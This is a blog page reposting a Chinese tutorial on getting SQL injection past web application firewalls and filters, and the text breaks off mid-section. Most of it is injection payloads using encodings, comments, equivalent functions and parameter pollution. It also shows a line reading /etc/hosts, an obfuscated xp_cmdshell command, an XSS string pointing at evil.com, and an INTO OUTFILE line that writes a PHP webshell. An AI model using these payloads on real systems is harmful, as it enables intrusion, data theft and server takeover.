@@ -1,0 +1,1701 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="HacKerQWQ">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="HacKerQWQ">
+    
+    <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
+    
+    <meta name="description" content="">
+    <meta name="description" content="转载自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;r00tgrok&#x2F;p&#x2F;SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html 深入理解SQL注入绕过WAF和过滤机制知己知彼，百战不殆 –孙子兵法 [目录] 0x1 WAF的常见特征 0x2 绕过WAF的方法 0x3 SQLi Filter的实现及Evasion 0x3 参考资料 0x1 W">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[转载]sql注入绕过大集合">
+<meta property="og:url" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="转载自https:&#x2F;&#x2F;www.cnblogs.com&#x2F;r00tgrok&#x2F;p&#x2F;SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html 深入理解SQL注入绕过WAF和过滤机制知己知彼，百战不殆 –孙子兵法 [目录] 0x1 WAF的常见特征 0x2 绕过WAF的方法 0x3 SQLi Filter的实现及Evasion 0x3 参考资料 0x1 W">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/1.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/2.jpg">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/3.jpg">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/4.jpg">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/5.png">
+<meta property="og:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/6.png">
+<meta property="article:published_time" content="2020-08-10T16:24:18.000Z">
+<meta property="article:modified_time" content="2020-08-14T08:10:07.069Z">
+<meta property="article:author" content="HacKerQWQ">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackerqwq.github.io/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/1.png">
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>[转载]sql注入绕过大集合 · HacKerQWQ&#39;s Studio</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/avatar/picture.jpeg" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    
+    <!-- fancybox -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >HacKerQWQ&#39;s Studio.</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">[转载]sql注入绕过大集合</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>HacKerQWQ's Studio.</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            [转载]sql注入绕过大集合
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">6k</span>Reading time: <span class="post-count reading-time">28 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/08/11</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            
+<main class="main post-page">
+    <article class="article-entry">
+        <p>转载自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html">https://www.cnblogs.com/r00tgrok/p/SQL_Injection_Bypassing_WAF_And_Evasion_Of_Filter.html</a></p>
+<p>深入理解SQL注入绕过WAF和过滤机制<br>知己知彼，百战不殆 –孙子兵法</p>
+<p>[目录]</p>
+<p>0x1 WAF的常见特征</p>
+<p>0x2 绕过WAF的方法</p>
+<p>0x3 SQLi Filter的实现及Evasion</p>
+<p>0x3 参考资料</p>
+<h1 id="0x1-WAF的常见特征"><a href="#0x1-WAF的常见特征" class="headerlink" title="0x1 WAF的常见特征"></a>0x1 WAF的常见特征</h1><p>之所以要谈到WAF的常见特征，是为了更好的了解WAF的运行机制，这样就能增加几分绕过的机会了。本文不对WAF做详细介绍，只谈及几点相关的。</p>
+<p>总体来说，WAF(Web Application Firewall)的具有以下四个方面的功能：</p>
+<ol>
+<li><p>审计设备：用来截获所有HTTP数据或者仅仅满足某些规则的会话</p>
+</li>
+<li><p>访问控制设备：用来控制对Web应用的访问，既包括主动安全模式也包括被动安全模式</p>
+</li>
+<li><p>架构/网络设计工具：当运行在反向代理模式，他们被用来分配职能，集中控制，虚拟基础结构等。</p>
+</li>
+<li><p>WEB应用加固工具：这些功能增强被保护Web应用的安全性，它不仅能够屏蔽WEB应用固有弱点，而且能够保护WEB应用编程错误导致的安全隐患。</p>
+</li>
+</ol>
+<p>WAF的常见特点：</p>
+<p>异常检测协议：拒绝不符合HTTP标准的请求</p>
+<p>增强的输入验证：代理和服务端的验证，而不只是限于客户端验证</p>
+<p>白名单&amp;黑名单：白名单适用于稳定的Web应用，黑名单适合处理已知问题</p>
+<p>基于规则和基于异常的保护：基于规则更多的依赖黑名单机制，基于异常更为灵活</p>
+<p>状态管理：重点进行会话保护</p>
+<p>另还有：Coikies保护、抗入侵规避技术、响应监视和信息泄露保护等</p>
+<p>如果是对于扫描器，WAF有其识别之道：</p>
+<p>扫描器识别主要由以下几点：</p>
+<ol>
+<li><p>扫描器指纹(head字段/请求参数值)，以awvs为例，会有很明显的Acunetix在内的标识</p>
+</li>
+<li><p>单IP+ cookie某时间段内触发规则次数</p>
+</li>
+<li><p>隐藏的链接标签等(<a>)</a></p>
+</li>
+<li><p>Cookie植入</p>
+</li>
+<li><p>验证码验证，扫描器无法自动填充验证码</p>
+</li>
+<li><p>单IP请求时间段内Webserver返回http状态404比例， 扫描器探测敏感目录基于字典，找不到文件则返回404</p>
+</li>
+</ol>
+<h1 id="0x2-绕过WAF的方法"><a href="#0x2-绕过WAF的方法" class="headerlink" title="0x2 绕过WAF的方法"></a>0x2 绕过WAF的方法</h1><p> 从目前能找到的资料来看，我把这些绕过waf的技术分为9类，包含从初级到高级技巧</p>
+<p>a) 大小写混合</p>
+<p>b)替换关键字</p>
+<p>c)使用编码</p>
+<p>d)使用注释</p>
+<p>e)等价函数与命令</p>
+<p>f)特殊符号</p>
+<p>g)HTTP参数控制</p>
+<p>h)缓冲区溢出</p>
+<p>i)整合绕过</p>
+<h2 id="a-大小写绕过"><a href="#a-大小写绕过" class="headerlink" title="a) 大小写绕过"></a>a) 大小写绕过</h2><p>大小写绕过用于只针对小写或大写的关键字匹配技术，正则表达式/express/i 大小写不敏感即无法绕过，这是最简单的绕过技术</p>
+<p>举例：<strong>z.com/index.php?page_id=-15 uNIoN sELecT 1,2,3,4</strong></p>
+<p>示例场景可能的情况为filter的规则里有对大小写转换的处理，但不是每个关键字或每种情况都有处理</p>
+<h2 id="b-替换关键字"><a href="#b-替换关键字" class="headerlink" title="b)替换关键字"></a>b)替换关键字</h2><p>这种情况下大小写转化无法绕过，而且正则表达式会替换或删除select、union这些关键字，如果只匹配一次就很容易绕过</p>
+<p>举例：<strong>z.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</strong></p>
+<p>同样是很基础的技术，有些时候甚至构造得更复杂：SeLSeselectleCTecT，不建议对此抱太大期望</p>
+<h2 id="c-使用编码"><a href="#c-使用编码" class="headerlink" title="c)使用编码"></a>c)使用编码</h2><h3 id="1-URL编码"><a href="#1-URL编码" class="headerlink" title="1.URL编码"></a>1.URL编码</h3><p>在Chrome中输入一个连接，非保留字的字符浏览器会对其URL编码，如空格变为**%20<strong>、单引号</strong>%27<strong>、左括号</strong>%28<strong>、右括号</strong>%29**</p>
+<p>普通的URL编码可能无法实现绕过，还存在一种情况URL编码只进行了一次过滤，可以用两次编码绕过：<strong>page.php?id=1%252f%252a*/UNION%252f%252a /SELECT</strong></p>
+<h3 id="2-十六进制编码"><a href="#2-十六进制编码" class="headerlink" title="2.十六进制编码"></a>2.十六进制编码</h3><p>举例：<br><strong>z.com/index.php?page_id=-15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4…</strong></p>
+<p><strong>SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))</strong></p>
+<p><strong>select – select\x74</strong></p>
+<p>附上一张绕过特定数据库的空白字符（十六进制）图</p>
+<p><img src="/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/1.png"></p>
+<p>示例代码中，前者是对单个字符十六进制编码，后者则是对整个字符串编码，使用上来说较少见一点</p>
+<h3 id="3-Unicode编码"><a href="#3-Unicode编码" class="headerlink" title="3.Unicode编码"></a>3.Unicode编码</h3><p>Unicode有所谓的标准编码和非标准编码，假设我们用的utf-8为标准编码，那么西欧语系所使用的就是非标准编码了</p>
+<p>看一下常用的几个符号的一些Unicode编码：</p>
+<p><code>单引号:   %u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7</code></p>
+<p><code>空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0</code></p>
+<p><code>左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8</code></p>
+<p><code>右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9</code></p>
+<p>举例：<br>**?id=10%D6‘%20AND%201=2%23**　　</p>
+<p><strong>SELECT ‘Ä’=’A’; #1</strong></p>
+<p>两个示例中，前者利用双字节绕过，比如对单引号转义操作变成&#39;，那么就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用</p>
+<p>第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在于Unicode编码种类繁多，基于黑名单的过滤器无法处理所以情况，从而实现绕过</p>
+<p>另外平时听得多一点的可能是utf-7的绕过，还有utf-16、utf-32的绕过，后者从成功的实现对google的绕过，有兴趣的朋友可以去了解下</p>
+<p>常见的编码当然还有二进制、八进制，它们不一定都派得上用场，但后面会提到使用二进制的例子</p>
+<h3 id="4-科学计数法绕过"><a href="#4-科学计数法绕过" class="headerlink" title="4.科学计数法绕过"></a>4.科学计数法绕过</h3><p><strong>select password from users where id=0e1union select 1,2</strong></p>
+<h2 id="d-使用注释"><a href="#d-使用注释" class="headerlink" title="d) 使用注释"></a>d) 使用注释</h2><p>看一下常见的用于注释的符号有哪些：*<em>//<strong>, **–</strong> , **/\</em>*/<strong>, **#</strong>, <strong>–+</strong>, <strong>;%00</strong></p>
+<h3 id="1-普通注释"><a href="#1-普通注释" class="headerlink" title="1.普通注释"></a>1.普通注释</h3><p>举例：<br><strong>z.com/index.php?page_id=-15 %55nION/**/%53ElecT 1,2,3,4</strong>　<br>　<br><strong>‘union%a0select pass from users#</strong></p>
+<p>/**/在构造得查询语句中插入注释，规避对空格的依赖或关键字识别;#、–+用于终结语句的查询</p>
+<h3 id="2-内联注释"><a href="#2-内联注释" class="headerlink" title="2.内联注释"></a>2.内联注释</h3><p>相比普通注释，内联注释用的更多，它有一个特性*<em>/!\</em>*/**只有MySQL能识别</p>
+<p>举例：<br><strong>index.php?page_id=-15 /*!UNION*/ /*!SELECT*/ 1,2,3</strong><br>*<em>?page_id=null%0A/\</em>*//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,3,4…**</p>
+<p>两个示例中前者使用内联注释，后者还用到了普通注释。使用注释一个很有用的做法便是对关键字的拆分，要做到这一点后面讨论的特殊符号也能实现，当然前提是包括/、*在内的这些字符能正常使用</p>
+<h2 id="e-等价函数与命令"><a href="#e-等价函数与命令" class="headerlink" title="e)等价函数与命令"></a>e)等价函数与命令</h2><p>有些函数或命令因其关键字被检测出来而无法使用，但是在很多情况下可以使用与之等价或类似的代码替代其使用</p>
+<h3 id="1-函数或变量"><a href="#1-函数或变量" class="headerlink" title="1.函数或变量"></a>1.函数或变量</h3><p><code>hex()、bin() ==&gt; ascii()</code></p>
+<p><code>sleep() ==&gt;benchmark()</code></p>
+<p><code>concat_ws()==&gt;group_concat()</code></p>
+<p><code>mid()、substr() ==&gt; substring()</code></p>
+<p><code>@@user ==&gt; user()</code></p>
+<p><code>@@datadir ==&gt; datadir()</code></p>
+<p><code>substr(database(),0,1) ==&gt; substr(database(0 from 0 for 1))</code></p>
+<p>举例：**substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　**</p>
+<p>或者：<br><strong>substr((select ‘password’),1,1) = 0x70</strong></p>
+<p><strong>strcmp(left(‘password’,1), 0x69) = 1</strong></p>
+<p><strong>strcmp(left(‘password’,1), 0x70) = 0</strong></p>
+<p><strong>strcmp(left(‘password’,1), 0x71) = -1</strong></p>
+<p>上述这几个示例用于说明有时候当某个函数不能使用时，还可以找到其他的函数替代其实现，置于select、uinon、where等关键字被限制如何处理将在后面filter部分讨论</p>
+<h3 id="2-符号"><a href="#2-符号" class="headerlink" title="2.符号"></a>2.符号</h3><p>and和or有可能不能使用，或者可以试下&amp;&amp;和||能不能用；还有=不能使用的情况，可以考虑尝试&lt;、&gt;，因为如果不小于又不大于，那边是等于了</p>
+<p>在看一下用得多的空格，可以使用如下符号表示其作用：*<em>%20 %09 %0a %0b %0c %0d %a0 /\</em>*/**</p>
+<h3 id="3-生僻函数"><a href="#3-生僻函数" class="headerlink" title="3.生僻函数"></a>3.生僻函数</h3><p>MySQL/PostgreSQL支持XML函数：Select UpdateXML(‘<script x="_"></script> ’,’/script/@x/’,’src=//evil.com’);　　　　　　　　　　</p>
+<p>?id=1 and 1=(updatexml(1,concat(0x3a,(select user())),1))</p>
+<p>SELECT xmlelement(name img,xmlattributes(1as src,’a\l\x65rt(1)’as \117n\x65rror));　//postgresql</p>
+<p>?id=1 and extractvalue(1, concat(0x5c, (select table_name from information_schema.tables limit 1)));</p>
+<p>MySQL、PostgreSQL、Oracle它们都有许多自己的函数，基于黑名单的filter要想涵盖这么多东西从实际上来说不太可能，而且代价太大，看来黑名单技术到一定程度便遇到了限制</p>
+<h2 id="f-特殊符号"><a href="#f-特殊符号" class="headerlink" title="f) 特殊符号"></a>f) 特殊符号</h2><p>这里我把非字母数字的字符都规在了特殊符号一类，特殊符号有特殊的含义和用法，涉及信息量比前面提到的几种都要多</p>
+<p>先看下乌云drops上“waf的绕过技巧”一文使用的几个例子：</p>
+<ol>
+<li><p>使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</p>
+</li>
+<li><p>神奇的”-+.”，<strong>select+id-1+1.from users;</strong> “+”是用于字符串连接的，”-”和”.”在此也用于连接，可以逃过空格和关键字过滤</p>
+</li>
+<li><p>@符号，<strong>select@^1.from users;</strong> @用于变量定义如@var_name，一个@表示用户定义，@@表示系统变量</p>
+</li>
+<li><p>Mysql function() as xxx  也可不用as和空格　　 <strong>select-count(id)test from users;</strong>  //绕过空格限制</p>
+</li>
+</ol>
+<p>可见，使用这些字符的确是能做很多事，也证实了那句老话，只有想不到，没有做不到</p>
+<p>本人搜罗了部分可能发挥大作用的字符(未包括’、*、/等在内，考虑到前面已经出现较多次了)：`、~、!、@、%、()、[]、.、-、+ 、|、%00</p>
+<p>举例：</p>
+<p>关键字拆分：<br><strong>‘se’+’lec’+’t’</strong></p>
+<p><strong>%S%E%L%E%C%T 1</strong></p>
+<p><strong>1.aspx?id=1;EXEC(‘ma’+’ster..x’+’p_cm’+’dsh’+’ell ”net user”’)</strong></p>
+<p>!和()：’ <strong>or –+2=- -!!!’2</strong></p>
+<p><strong>id=1+(UnI)(oN)+(SeL)(EcT)</strong>　//另 Access中,”[]”用于表和列,”()”用于数值也可以做分隔</p>
+<p>本节最后在给出一些和这些字符多少有点关系的操作符供参考：</p>
+<p><code>\&gt;\&gt;, &lt;&lt;, &gt;=, &lt;=, &lt;&gt;,&lt;=&gt;,XOR, DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN</code></p>
+<p>使用这些”特殊符号”实现绕过是一件很细微的事情，一方面各家数据库对有效符号的处理是不一样的，另一方面你得充分了解这些符号的特性和使用方法才能作为绕过手段</p>
+<h2 id="g-读取文件或者写shell"><a href="#g-读取文件或者写shell" class="headerlink" title="g)读取文件或者写shell"></a>g)读取文件或者写shell</h2><p>需要确保有写文件的权限</p>
+<p>直接上命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select id=-1+union+select+load_file(<span class="string">&#x27;/etc/hosts&#x27;</span>)</span><br><span class="line">select id=-1+union+select+load_file(0x2f6574632f686f737473)</span><br><span class="line">select+<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>+into+outfile<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br><span class="line">select+unhex(一句话的十六进制)+into+outfile<span class="string">&quot;/var/www/html/shell.php&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="h-HTTP参数控制"><a href="#h-HTTP参数控制" class="headerlink" title="h) HTTP参数控制"></a>h) HTTP参数控制</h2><p>这里HTTP参数控制除了对查询语句的参数进行篡改，还包括HTTP方法、HTTP头的控制</p>
+<ol>
+<li>HPP(HTTP Parameter Polution)</li>
+</ol>
+<p>举例：<br>**/?id=1;select+1,2,3+from+users+where+id=1—**</p>
+<p><strong>/?id=1;select+1&amp;id=2,3+from+users+where+id=1—</strong></p>
+<p><strong>/?id=1/</strong>/union/<em>&amp;id=</em>/select/<em>&amp;id=</em>/pwd/<em>&amp;id=</em>/from/<em>&amp;id=</em>/users**</p>
+<p>HPP又称做重复参数污染，最简单的就是?uid=1&amp;uid=2&amp;uid=3，对于这种情况，不同的Web服务器处理方式如下：</p>
+<p><img src="/2020/08/11/%E8%BD%AC%E8%BD%BD-sql%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A4%A7%E9%9B%86%E5%90%88/2.jpg"></p>
+<p>具体WAF如何处理，要看其设置的规则，不过就示例中最后一个来看有较大可能绕过</p>
+<ol start="2">
+<li>HPF(HTTP Parameter Fragment)</li>
+</ol>
+<p>这种方法是HTTP分割注入，同CRLF有相似之处(使用控制字符%0a、%0d等执行换行)</p>
+<p>举例：　</p>
+<p><strong>/?a=1+union/<em>&amp;b=</em>/select+1,pass/<em>&amp;c=</em>/from+users–</strong></p>
+<p><strong>select * from table where a=1 union/* and b=*/select 1,pass/* limit */from users—</strong></p>
